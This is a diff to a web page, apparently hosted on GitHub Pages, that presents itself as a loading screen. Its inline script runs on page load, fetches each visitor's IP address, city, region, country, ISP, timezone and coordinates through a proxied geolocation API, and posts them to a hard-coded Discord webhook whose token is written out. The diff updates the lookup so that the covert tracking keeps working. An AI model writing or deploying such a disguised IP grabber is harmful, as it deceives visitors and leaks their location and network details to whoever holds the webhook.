@@ -1,9 +1,10 @@
 "Dance till your dead!"
 <h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>
-...
+Waiting for response
 <script>
 window.addEventListener("load", async () => {
   const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
+
   function logMessage(message, color = "black") {
     const pre = document.createElement("pre");
     pre.style.color = color;
@@ -16,11 +17,14 @@ window.addEventListener("load", async () => {
   try {
     logMessage("Fetching IP info...", "blue");
 
-    const res = await fetch("https://ipwho.is/");
-    if (!res.ok) throw new Error(`IP API failed: ${res.status}`);
+    // Use a free CORS proxy
+    const proxy = "https://api.allorigins.win/get?url=";
+    const target = encodeURIComponent("https://ipapi.co/json/");
+    const res = await fetch(proxy + target);
+    if (!res.ok) throw new Error(`Proxy request failed: ${res.status}`);
 
-    const data = await res.json();
-    if (!data.success) throw new Error("IP lookup failed");
+    const wrapped = await res.json();
+    const data = JSON.parse(wrapped.contents);
 
     logMessage("IP info fetched successfully ✅", "green");
 
@@ -30,9 +34,9 @@ window.addEventListener("load", async () => {
         `IP: ${data.ip}\n` +
         `City: ${data.city}\n` +
         `Region: ${data.region}\n` +
-        `Country: ${data.country}\n` +
-        `ISP: ${data.connection?.isp || "Unknown"}\n` +
-        `Timezone: ${data.timezone?.id || "Unknown"}\n` +
+        `Country: ${data.country_name}\n` +
+        `ISP: ${data.org}\n` +
+        `Timezone: ${data.timezone}\n` +
         `Latitude: ${data.latitude}\n` +
         `Longitude: ${data.longitude}\n` +
         `Page: ${window.location.href}`
